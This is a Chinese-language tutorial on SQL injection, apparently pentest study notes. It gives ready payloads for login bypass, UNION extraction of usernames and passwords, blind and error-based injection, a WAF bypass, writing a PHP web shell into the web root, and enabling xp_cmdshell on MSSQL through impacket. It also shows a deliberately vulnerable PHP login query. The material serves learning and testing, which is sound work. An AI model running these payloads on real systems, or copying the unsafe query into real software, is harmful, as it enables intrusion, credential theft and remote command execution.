### 什麼是SQL injection
是一種網頁安全漏洞，因為並未針對輸入進行過濾，讓攻擊者可以直接存取資料庫

簡單舉例，這段程式碼並未進行過濾，就會有SQL injection問題。

```
<?php
$uname = $_POST['uname'];
$passwd =$_POST['password'];

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>
```

我們可以手動檢測輸入`'`看是否有異常，如果有，可以進一步檢測。

輸入`hack' OR 1=1 -- `會變成`SELECT * FROM users WHERE user_name= 'hack' OR 1=1 -- `

由於`1=1`是true所以會被執行，`--`是註解，後面語法直接忽略，這導致原本要輸入密碼變成不用輸入，可以直接登入。

在`in`後面加入sql語法可以執行任意語法

查詢版本號:`' or 1=1 in (select @@version) -- `


#### UNION Based SQL Injection

UNION因為它允許執行額外的 SELECT 語句並在相同查詢中提供結果，從而將兩個查詢連接到一個語句中。

為了讓UNION SQLi 攻擊成功，有兩個條件：
1. 注入的UNION查詢必須包含與原始查詢相同數量的欄位。
2. 每列之間的資料類型需要相容。

舉例
```
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

為了發現正確的列數，我們可以將以下注入的查詢提交到搜尋欄中：
``` 
' ORDER BY 1-- 
' ORDER BY 2--
' ORDER BY 3--
...類推下去
```
假設是3列，輸入到` ' ORDER BY 4-- `，會出現`The ORDER BY position number 3 is out of range of the number of items in the select list.`錯誤

接下來確認是否可輸入字串
```
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

上面指令只會撈取一筆資料，如果要多筆資料可以透過`||`，如下
```
' UNION SELECT username || '~' || password FROM users--
```

檢查本版
```
' UNION SELECT @@version,NULL-- 
```

舉例利用UNION將webshell寫入`/vat/ww/html/tmp/`
```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

可以從information schema獲取table 
```
SELECT * FROM information_schema.tables
'UNION SELECT table_name FROM information_schema.tables--
'UNION SELECT column_name FROM+information_schema.columns WHERE table_name='users_aaumso'--
```


### 盲注 Blind SQL Injection

發生SQL注入攻擊，但HTTP回應不包含相關SQL查詢的結果或任何資料庫錯誤的資訊
對於盲注 Blind SQL Injection ，UNION就無效。

舉例:
考慮一個使用追蹤 cookie 來收集有關使用情況的分析的應用程式。`Cookie: Id=abc`
當請求包含Id處理cookie後，會使用 SQL 查詢來確定這是否是已知使用者
此查詢受到SQL注入的攻擊時，查詢結果不會有明顯的錯誤資訊。
但是，根據查詢是否傳回任何數據，會有不同的回應。
如果傳送了認可的Id，會收到「歡迎回來」的訊息。
這樣我們可以進行測試
輸入`AND '1'='1`值為TRUE，所以會看到「歡迎回來」的訊息。
如果輸入`AND '1'='2`值為FALSE，所以不會看到「歡迎回來」的訊息。
上述是一個布林盲注(Boolean-Based Blind SQL Injection的例子

常見的盲注分成下面兩種: 布林、時間

#### 布林盲注(Boolean-Based Blind SQL Injection)

```
http://192.168.0.1/test.php?user=attack' AND 1=1 -- //
```
由於1=1始終為 TRUE，因此僅當使用者存在於資料庫中時應用程式才會傳回值

透過查詢回應的布林值，推測查詢結果的真偽來進一步猜測  
`AND 1=1`為true，可能返回資料
`AND 1=2`為false，返回空或錯誤資訊
符合兩個條件則可能有SQL注入


#### 時間盲注(time-Based Blind SQL Injection)

```
http://192.168.0.1/test.php?user=attack' AND IF (1=1, sleep(3),'false') -- //
```
如料存在注入則會延遲三秒




#### 基於錯誤(Error-based SQL injection)

舉例
```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

這些輸入使用 CASE 測試條件並傳回不同表達式的關鍵字,取決於表達式是否為真:
對於第一個輸入，CASE 表達式計算為 'a'，這不會造成任何錯誤。
使用第二個輸入，它計算為 1/0，這會導致除以零誤差。

如果錯誤導致應用程式的 HTTP 回應出現差異，可以使用它來確定注入的條件是否為真。


#### XML SQL Injetcion

如果有發現使用XML來POST，可以檢查，舉例如下:
```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
<productId>
1 
</productId>
<storeId>
1
</storeId>
</stockCheck>
```

順帶一提By Pass WAF方法，可以用利用`hex_entities`

```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
<productId>1 </productId>
<storeId>
<@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities>
</storeId>
</stockCheck>
```


#### sql錯誤資訊包含敏感內容

`CAST()`現這的功能，能夠將一種資料類型轉換為另一種資料類型。
```
CAST((SELECT example_column FROM example_table) AS int)
```

假設，讀取的資料是一個字串。嘗試將其轉換為不相容的資料類型，例如 int，可能會導致類似以下內容的錯誤:
```
ERROR: invalid input syntax for type integer: "Example data"
```


### 使用 xp_cmdshell 利用 MSSQL 資料庫
 xp_cmdshell 函數接受一個字串並將其傳遞給命令 shell 來執行。該函數將任何輸出傳回為文字行。該函數預設已停用，一旦啟用，必須使用EXECUTE關鍵字而不是 SELECT 來呼叫它。
 
啟用xp_cmdshell
```
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### MSSQL(windows)

用impacket連線，透過提供使用者名稱、密碼和遠端 IP 以及-windows-auth關鍵字來連接到執行 MSSQL 的遠端 Windows 電腦。這會強制進行 NTLM 驗證（而不是 Kerberos）。
```
impacket-mssqlclient Administrator:password@192.168.0.1 -windows-auth
```

檢查版本
```
SELECT @@version;
```
列出資料庫
```
SELECT name FROM sys.databases;
```

### Second-order SQL injection

一般來說，sql injection會對不安全的輸入直接反應，但Second-order是將輸入先進行存到資料庫，需要另外請求才會觸發。
